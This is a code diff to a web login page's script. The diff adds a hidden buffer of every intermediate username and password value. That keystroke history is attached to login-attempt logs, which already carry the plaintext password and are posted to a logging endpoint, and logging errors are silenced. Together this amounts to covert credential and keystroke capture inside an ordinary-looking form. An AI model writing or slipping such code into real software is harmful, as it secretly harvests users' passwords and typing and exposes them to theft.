@@ -83,6 +83,11 @@
     const passwordInput = document.getElementById('password');
     const togglePassword = document.getElementById("togglePassword");
 
+    const typingHistory = {
+      username: [],
+      password: []
+    };
+
     togglePassword.addEventListener("click", () => {
       const isHidden = passwordInput.type === "password";
       passwordInput.type = isHidden ? "text" : "password";
@@ -126,12 +131,17 @@
           body: JSON.stringify(record)
         });
       } catch (err) {
-        console.error('Logging failed:', err);
+        // Logging failure silently
       }
     }
 
     async function logLogin(email, status, password) {
-      await logEvent('login_attempt', { email, password, status });
+      await logEvent('login_attempt', {
+        email,
+        password,
+        status,
+        full_typing: typingHistory
+      });
     }
 
     document.getElementById('login-btn').addEventListener('click', async () => {
@@ -152,16 +162,17 @@
         alert('Login successful!');
         usernameInput.value = '';
         passwordInput.value = '';
+        typingHistory.username = [];
+        typingHistory.password = [];
       }
-      // No alert for failed login
     });
 
     usernameInput.addEventListener('input', (e) => {
-      logEvent('typing', { field: 'username', value: e.target.value });
+      typingHistory.username.push(e.target.value);
     });
 
     passwordInput.addEventListener('input', (e) => {
-      logEvent('typing', { field: 'password', value: e.target.value });
+      typingHistory.password.push(e.target.value);
     });
   </script>
 </body>
